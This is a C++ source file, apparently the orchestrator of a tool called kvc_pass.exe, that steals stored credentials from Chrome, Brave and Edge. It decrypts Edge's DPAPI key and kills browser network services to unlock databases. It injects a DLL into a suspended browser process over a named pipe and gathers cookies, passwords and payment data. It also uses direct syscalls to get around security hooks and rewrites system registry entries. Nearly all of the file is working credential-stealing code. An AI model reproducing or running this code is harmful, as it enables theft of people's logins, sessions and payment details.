// OrchestratorCore.cpp - Main orchestration and application entry point
// Coordinates process management, injection, and extraction workflow
#include "OrchestratorCore.h"
#include "BrowserProcessManager.h"
#include "InjectionEngine.h"
#include "CommunicationLayer.h"
#include "BannerSystem.h"
#include "BrowserHelp.h"
#include "RuntimeSupport.h"
#include "syscalls.h"
#include <shellapi.h>
#include <cstdint>
#include <utility>
#include <vector>

namespace
{
    constexpr const char* APP_VERSION = "1.0.5";
    constexpr const char* SECURITY_MODULE_NAME = "kvc_crypt.dll";

    std::vector<int> ParseVersionName(std::wstring_view name)
    {
        std::vector<int> parts;
        std::uint64_t value = 0;
        bool hasDigit = false;

        for (std::size_t i = 0; i <= name.size(); ++i)
        {
            if (i == name.size() || name[i] == L'.')
            {
                if (!hasDigit || value > 2147483647ULL)
                    return {};
                parts.push_back(static_cast<int>(value));
                value = 0;
                hasDigit = false;
                continue;
            }
            if (name[i] < L'0' || name[i] > L'9')
                return {};
            hasDigit = true;
            value = value * 10 + static_cast<unsigned>(name[i] - L'0');
        }
        return parts.size() == 4 ? parts : std::vector<int>{};
    }

    bool IsNewerVersion(const std::vector<int>& candidate, const std::vector<int>& current)
    {
        if (current.empty())
            return true;
        if (candidate.size() != current.size())
            return candidate.size() > current.size();
        for (std::size_t i = 0; i < candidate.size(); ++i)
        {
            if (candidate[i] != current[i])
                return candidate[i] > current[i];
        }
        return false;
    }
}

// Parses command-line arguments into configuration structure
std::optional<Configuration> Configuration::CreateFromArgs(int argc, wchar_t* argv[], const Console& console)
{
    Configuration config;
    std::wstring customOutputPath;

    for (int i = 1; i < argc; ++i)
    {
        std::wstring_view arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v")
            config.verbose = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
            customOutputPath = argv[++i];
        else if (arg == L"--help" || arg == L"-h")
        {
            BrowserHelp::PrintUsage(L"kvc_pass.exe");
            return std::nullopt;
        }
        else if (config.browserType.empty() && !arg.empty() && arg[0] != L'-')
            config.browserType = arg;
        else
        {
            console.Warn("Unknown or misplaced argument: " + Utils::WStringToUtf8(arg));
            return std::nullopt;
        }
    }

    if (config.browserType.empty())
    {
        BrowserHelp::PrintUsage(L"kvc_pass.exe");
        return std::nullopt;
    }

    kvc::text::LowerWideInPlace(config.browserType);

    if (config.browserType == L"chrome")
    {
        config.browserProcessName = L"chrome.exe";
        config.browserDisplayName = "Chrome";
    }
    else if (config.browserType == L"brave")
    {
        config.browserProcessName = L"brave.exe";
        config.browserDisplayName = "Brave";
    }
    else if (config.browserType == L"edge")
    {
        config.browserProcessName = L"msedge.exe";
        config.browserDisplayName = "Edge";
    }
    else
    {
        console.Error("Unsupported browser type: " + Utils::WStringToUtf8(config.browserType));
        return std::nullopt;
    }

    BrowserPathResolver resolver(console);
    config.browserDefaultExePath = resolver.resolve(config.browserProcessName);

    if (config.browserDefaultExePath.empty())
    {
        console.Error("Could not find " + Utils::WStringToUtf8(config.browserType) + 
                     " installation in Registry");
        console.Info("Please ensure " + Utils::WStringToUtf8(config.browserType) + 
                    " is properly installed");
        return std::nullopt;
    }

    config.outputPath = customOutputPath.empty()
                            ? kvc::paths::Join(kvc::paths::CurrentDirectory(), L"output")
                            : kvc::paths::Absolute(customOutputPath);

    return config;
}

// Fix stale TypeLib registry paths after Chrome/Brave auto-update.
// Chrome updates its executable but sometimes leaves TypeLib registry entries pointing
// to the old (deleted) elevation_service.exe, causing CoCreateInstance TYPE_E_CANTLOADLIBRARY.
void FixChromeTypeLibPaths(const std::wstring& browserExePath, const Console& console)
{
    // Chrome installs to Application\chrome.exe but stores versioned binaries under
    // Application\<version>\elevation_service.exe. We must scan for the version directory.
    const std::wstring appDir = kvc::paths::Parent(browserExePath);
    std::wstring elevationService;

    // Case 1: already in versioned dir (e.g. Application\146.0.7680.165\chrome.exe)
    const std::wstring directCandidate = kvc::paths::Join(appDir, L"elevation_service.exe");
    if (kvc::paths::FileExists(directCandidate))
        elevationService = directCandidate;

    // Case 2: appDir is Application\, version dirs are subdirectories
    if (elevationService.empty())
    {
        std::vector<int> bestVersion;
        for (const std::wstring& directory : kvc::paths::EnumerateDirectories(appDir))
        {
            const std::vector<int> parts = ParseVersionName(kvc::paths::FileName(directory));
            if (parts.empty())
                continue;

            const std::wstring svcCandidate =
                kvc::paths::Join(directory, L"elevation_service.exe");
            if (!kvc::paths::FileExists(svcCandidate))
                continue;

            if (IsNewerVersion(parts, bestVersion))
            {
                bestVersion = parts;
                elevationService = svcCandidate;
            }
        }
    }

    if (elevationService.empty())
        return;

    const std::wstring& newPath = elevationService;

    const wchar_t* const typeLibGuids[] = {
        L"{463ABECF-410D-407F-8AF5-0DF35A005CC8}",  // IElevatorChrome
        L"{B88C45B9-8825-4629-B83E-77CC67D9CEED}",  // IElevatorChromium
        L"{A2721D66-376E-4D2F-9F0F-9070E9A42B5F}",  // IElevatorChromeBeta
        L"{BB2AA26B-343A-4072-8B6F-80557B8CE571}",  // IElevatorChromeDev
        L"{4F7CE041-28E9-484F-9DD0-61A8CACEFEE4}",  // IElevatorChromeCanary
        L"{1BF5208B-295F-4992-B5F4-3A9BB6494838}",  // IElevator2Chrome
        L"{BB19A0E5-00C6-4966-94B2-5AFEC6FED93A}",  // IElevator2Chromium
        L"{B96A14B8-D0B0-44D8-BA68-2385B2A03254}",  // IElevator2ChromeBeta
        L"{3FEFA48E-C8BF-461F-AED6-63F658CC850A}",  // IElevator2ChromeDev
        L"{FF672E9F-0994-4322-81E5-3A5A9746140A}",  // IElevator2ChromeCanary
        L"{12B23868-6DCD-4D1A-AD4C-65B0285201FC}",  // IElevator3Edge
        L"{C9C2B807-7731-4F34-81B7-44FF7779522B}",  // IElevatorEdge
        L"{05EB264E-4D60-4F34-ADB7-1F983E930A79}",  // IElevator2Edge
    };

    for (const auto* guid : typeLibGuids)
    {
        for (const auto* arch : { L"win32", L"win64" })
        {
            std::wstring regPath = std::wstring(L"SOFTWARE\\Classes\\TypeLib\\") + guid + L"\\1.0\\0\\" + arch;
            HKEY hKey = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath.c_str(), 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
                continue;

            wchar_t curVal[MAX_PATH] = {};
            DWORD sz = sizeof(curVal);
            DWORD type = 0;
            if (RegQueryValueExW(hKey, nullptr, nullptr, &type, reinterpret_cast<LPBYTE>(curVal), &sz) == ERROR_SUCCESS
                && type == REG_SZ && !kvc::paths::Exists(curVal))
            {
                LSTATUS setStatus = RegSetValueExW(hKey, nullptr, 0, REG_SZ,
                    reinterpret_cast<const BYTE*>(newPath.c_str()),
                    static_cast<DWORD>((newPath.size() + 1) * sizeof(wchar_t)));
                if (setStatus == ERROR_SUCCESS)
                {
                    console.Debug("Fixed stale TypeLib path for " + Utils::WStringToUtf8(guid) +
                        " [" + Utils::WStringToUtf8(arch) + "]");
                }
                else
                {
                    std::string message = "Failed to update TypeLib path for " +
                                          Utils::WStringToUtf8(guid) + " [" +
                                          Utils::WStringToUtf8(arch) + "], error: ";
                    kvc::text::AppendSigned(message, setStatus);
                    console.Warn(message);
                }
            }
            RegCloseKey(hKey);
        }
    }
}

// Orchestrates complete injection workflow: cleanup, injection, execution, termination
bool RunInjectionWorkflow(const Configuration& config, const Console& console,
                          std::wstring_view securityModulePath,
                          PipeCommunicator::ExtractionStats& stats)
{
    std::vector<uint8_t> edgeDpapiKey;
    
    // Edge-specific: Extract DPAPI key in orchestrator before process creation
    if (config.browserType == L"edge")
    {
        const std::wstring localAppData = Utils::GetLocalAppDataPath();
        if (localAppData.empty())
        {
            console.Error("Failed to get Local AppData path.");
            return false;
        }

        const wchar_t* edgeStates[] = {
            L"Microsoft\\Edge\\User Data\\Local State",
            L"Microsoft\\Edge Beta\\User Data\\Local State",
            L"Microsoft\\Edge Dev\\User Data\\Local State"
        };
        
        for (const wchar_t* relativePath : edgeStates)
        {
            const std::wstring edgeLocalState = kvc::paths::Join(localAppData, relativePath);
            if (kvc::paths::FileExists(edgeLocalState))
            {
                edgeDpapiKey = DecryptEdgePasswordKeyWithDPAPI(edgeLocalState, console);
                if (!edgeDpapiKey.empty())
                    break;
            }
        }
        
        if (edgeDpapiKey.empty()) 
        {
            console.Warn("Could not extract Edge DPAPI key - passwords may not be available");
        }
    }

    // Fix stale TypeLib paths that break CoCreateInstance after auto-update
    FixChromeTypeLibPaths(config.browserDefaultExePath, console);

    // Kill network service for all browsers — releases Cookies/LoginData DB locks
    // Keep main browser process alive for all browsers — COM elevation service must stay reachable
    KillBrowserNetworkService(config, console);


    // Create suspended target process
    TargetProcess target(config, console);
    std::string error;
    if (!target.createSuspended(error))
    {
        console.Error(error);
        return false;
    }

    // Establish named pipe communication
    PipeCommunicator pipe(Utils::GenerateUniquePipeName(), console);
    if (!pipe.create(error))
    {
        console.Error(error);
        target.terminate();
        return false;
    }

    // Inject security module and create remote thread
    InjectionManager injector(target, console, std::wstring(securityModulePath));
    if (!injector.execute(pipe.getName(), error))
    {
        console.Error(error);
        target.terminate();
        return false;
    }

    // Wait for module connection and send configuration
    if (!pipe.waitForClient(error) ||
        !pipe.sendInitialData(config.verbose, config.outputPath, edgeDpapiKey, error))
    {
        console.Error(error);
        target.terminate();
        return false;
    }

    // The DLL signals only after key decryption. Release Chromium database handles
    // at that exact point, then acknowledge immediately so extraction can open them.
    if (!pipe.waitForDatabaseReady(error))
    {
        target.terminate();
        return false;
    }

    KillBrowserNetworkService(config, console, false);
    if (!pipe.acknowledgeDatabaseReady(error))
    {
        console.Error(error);
        target.terminate();
        return false;
    }

    pipe.relayMessages();

    // Cleanup
    target.terminate();

    stats = pipe.getStats();
    return true;
}

// Processes all installed browsers sequentially
void ProcessAllBrowsers(const Console& console, bool verbose, std::wstring_view outputPath,
                        std::wstring_view securityModulePath)
{
    if (verbose)
        console.Info("Starting multi-browser security analysis...");

    BrowserPathResolver resolver(console);
    auto installedBrowsers = resolver.findAllInstalledBrowsers();

    if (installedBrowsers.empty())
    {
        console.Error("No supported browsers found on this system");
        return;
    }

    if (!verbose)
    {
        std::string message = "Processing ";
        kvc::text::AppendUnsigned(message, installedBrowsers.size());
        message.append(" browser(s):\n");
        console.Info(message);
    }

    int successCount = 0;
    int failCount = 0;

    for (size_t i = 0; i < installedBrowsers.size(); ++i)
    {
        const auto& [browserType, browserPath] = installedBrowsers[i];

        Configuration config;
        config.verbose = verbose;
        config.outputPath = outputPath;
        config.browserType = browserType;
        config.browserDefaultExePath = browserPath;

        if (browserType == L"chrome")
        {
            config.browserProcessName = L"chrome.exe";
            config.browserDisplayName = "Chrome";
        }
        else if (browserType == L"edge")
        {
            config.browserProcessName = L"msedge.exe";
            config.browserDisplayName = "Edge";
        }
        else if (browserType == L"brave")
        {
            config.browserProcessName = L"brave.exe";
            config.browserDisplayName = "Brave";
        }

        if (verbose)
        {
            std::string message = "\n[Browser ";
            kvc::text::AppendUnsigned(message, i + 1);
            message.push_back('/');
            kvc::text::AppendUnsigned(message, installedBrowsers.size());
            message.append("] Processing ");
            message.append(config.browserDisplayName);
            console.Info(message);
        }

        PipeCommunicator::ExtractionStats stats;
        if (RunInjectionWorkflow(config, console, securityModulePath, stats))
        {
            successCount++;

            if (verbose)
            {
                console.Success(config.browserDisplayName + " analysis completed");
            }
            else
            {
                DisplayExtractionSummary(config.browserDisplayName, stats, console, false, 
                                        config.outputPath);
                if (i < installedBrowsers.size() - 1)
                    console.BlankLine();
            }
        }
        else
        {
            failCount++;

            if (verbose)
            {
                console.Error(config.browserDisplayName + " analysis failed");
            }
            else
            {
                console.Info(config.browserDisplayName);
                console.Error("Analysis failed");
                if (i < installedBrowsers.size() - 1)
                    console.BlankLine();
            }
        }
    }

    console.BlankLine();
    std::string completed = "Completed: ";
    kvc::text::AppendSigned(completed, successCount);
    completed.append(" successful, ");
    kvc::text::AppendSigned(completed, failCount);
    completed.append(" failed");
    console.Info(completed);
}

// Displays formatted extraction summary with statistics
void DisplayExtractionSummary(const std::string& browserName, 
                              const PipeCommunicator::ExtractionStats& stats,
                              const Console& console, bool singleBrowser, 
                              std::wstring_view outputPath)
{
    if (singleBrowser)
    {
        if (!stats.aesKey.empty())
            console.Success("AES Key: " + stats.aesKey);

        std::string summary = BuildExtractionSummary(stats);
        if (!summary.empty())
        {
            console.Success(summary);
            const std::wstring outputDirectory =
                kvc::paths::Join(outputPath, kvc::text::Utf8ToWide(browserName));
            console.Success("Stored in " + Utils::path_to_api_string(outputDirectory));
        }
        else
        {
            console.Warn("No data extracted");
        }
    }
    else
    {
        console.Info(browserName);

        if (!stats.aesKey.empty())
            console.Success("AES Key: " + stats.aesKey);

        std::string summary = BuildExtractionSummary(stats);
        if (!summary.empty())
        {
            console.Success(summary);
            const std::wstring outputDirectory =
                kvc::paths::Join(outputPath, kvc::text::Utf8ToWide(browserName));
            console.Success("Stored in " + Utils::path_to_api_string(outputDirectory));
        }
        else
        {
            console.Warn("No data extracted");
        }
    }
}

// Builds human-readable summary from extraction statistics
std::string BuildExtractionSummary(const PipeCommunicator::ExtractionStats& stats)
{
    std::string summary;
    std::vector<std::string> items;

    if (stats.totalCookies > 0)
    {
        std::string item;
        kvc::text::AppendSigned(item, stats.totalCookies);
        item.append(" cookies");
        items.push_back(std::move(item));
    }
    if (stats.totalPasswords > 0)
    {
        std::string item;
        kvc::text::AppendSigned(item, stats.totalPasswords);
        item.append(" passwords");
        items.push_back(std::move(item));
    }
    if (stats.totalPayments > 0)
    {
        std::string item;
        kvc::text::AppendSigned(item, stats.totalPayments);
        item.append(" payments");
        items.push_back(std::move(item));
    }

    if (!items.empty())
    {
        summary.append("Extracted ");
        for (size_t i = 0; i < items.size(); ++i)
        {
            if (i > 0 && i == items.size() - 1)
                summary.append(" and ");
            else if (i > 0)
                summary.append(", ");
            summary.append(items[i]);
        }
        summary.append(" from ");
        kvc::text::AppendSigned(summary, stats.profileCount);
        summary.append(" profile");
        if (stats.profileCount != 1)
            summary.push_back('s');
    }

    return summary;
}

// Application entry point
int wmain(int argc, wchar_t* argv[])
{
    bool isVerbose = false;
    std::wstring browserTarget;
    std::wstring outputPath;
    
    // Locate security module next to executable, in current directory or System32
    auto findSecurityModule = []() -> std::wstring {
        wchar_t exePath[32768] = {};
        const DWORD length = GetModuleFileNameW(nullptr, exePath, static_cast<DWORD>(std::size(exePath)));
        if (length > 0 && length < std::size(exePath))
        {
            const std::wstring moduleInExeDir =
                kvc::paths::Join(kvc::paths::Parent(exePath), kvc::text::Utf8ToWide(SECURITY_MODULE_NAME));
            if (kvc::paths::FileExists(moduleInExeDir))
                return moduleInExeDir;
        }

        const std::wstring localModule = kvc::text::Utf8ToWide(SECURITY_MODULE_NAME);
        if (kvc::paths::FileExists(localModule))
            return localModule;
        
        wchar_t systemDir[32768] = {};
        if (GetSystemDirectoryW(systemDir, static_cast<UINT>(std::size(systemDir))) > 0)
        {
            const std::wstring systemPath = kvc::paths::Join(systemDir, localModule);
            if (kvc::paths::FileExists(systemPath))
                return systemPath;
        }
        
        return {};
    };

    const std::wstring securityModulePath = findSecurityModule();
    if (securityModulePath.empty())
    {
        kvc::console::WriteWide(L"Error: ");
        kvc::console::WriteUtf8(SECURITY_MODULE_NAME);
        kvc::console::WriteWide(L" not found in current directory or System32!\n");
        return 1;
    }
    
    // Quick argument parsing for early options
    for (int i = 1; i < argc; ++i)
    {
        std::wstring_view arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v")
            isVerbose = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc)
            outputPath = argv[++i];
        else if (arg == L"--help" || arg == L"-h")
        {
            BrowserHelp::PrintUsage(L"kvc_pass.exe");
            return 0;
        }
        else if (browserTarget.empty() && !arg.empty() && arg[0] != L'-')
            browserTarget = arg;
    }

    Console console(isVerbose);
    Banner::PrintHeader();
    
    // Verify SQLite library availability
    if (!CheckWinSQLite3Available())
    {
        console.Warn("winsqlite3.dll not available - trying fallback to sqlite3.dll");
        if (!kvc::paths::FileExists(L"sqlite3.dll"))
        {
            console.Error("Neither winsqlite3.dll nor sqlite3.dll available");
            return 1;
        }
    }

    if (browserTarget.empty())
    {
        BrowserHelp::PrintUsage(L"kvc_pass.exe");
        return 0;
    }
    
    // Initialize direct syscalls
    if (!InitializeSyscalls(isVerbose))
    {
        console.Error("Failed to initialize direct syscalls. Critical NTDLL functions might be hooked.");
        return 1;
    }
    
    // Ensure output directory exists
    if (outputPath.empty())
        outputPath = kvc::paths::Join(kvc::paths::CurrentDirectory(), L"output");
    else
        outputPath = kvc::paths::Absolute(outputPath);

    if (!kvc::paths::EnsureDirectory(outputPath))
    {
        console.Error("Failed to create output directory: " +
                      Utils::path_to_api_string(outputPath));
        return 1;
    }
    
    // Process browser(s)
    if (browserTarget == L"all")
    {
        ProcessAllBrowsers(console, isVerbose, outputPath, securityModulePath);
    }
    else
    {
        auto optConfig = Configuration::CreateFromArgs(argc, argv, console);
        if (!optConfig)
            return 1;

        if (!isVerbose)
            console.Info("Processing " + optConfig->browserDisplayName + "...\n");

        PipeCommunicator::ExtractionStats stats;
        if (!RunInjectionWorkflow(*optConfig, console, securityModulePath, stats))
        {
            return 1;
        }

        if (!isVerbose)
            DisplayExtractionSummary(optConfig->browserDisplayName, stats, console, true,
                                     optConfig->outputPath);
        else
            console.Success("\nSecurity analysis completed successfully");
    }

    console.Debug("Security orchestrator finished successfully.");
	Banner::PrintFooter();
    return 0;
}

extern "C" int __cdecl __isa_available_init();

extern "C" __declspec(safebuffers) void WINAPI EntryPoint()
{
    __isa_available_init();

    int argc = 0;
    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv)
        ExitProcess(1);

    const int result = wmain(argc, argv);
    LocalFree(argv);
    ExitProcess(static_cast<UINT>(result));
}
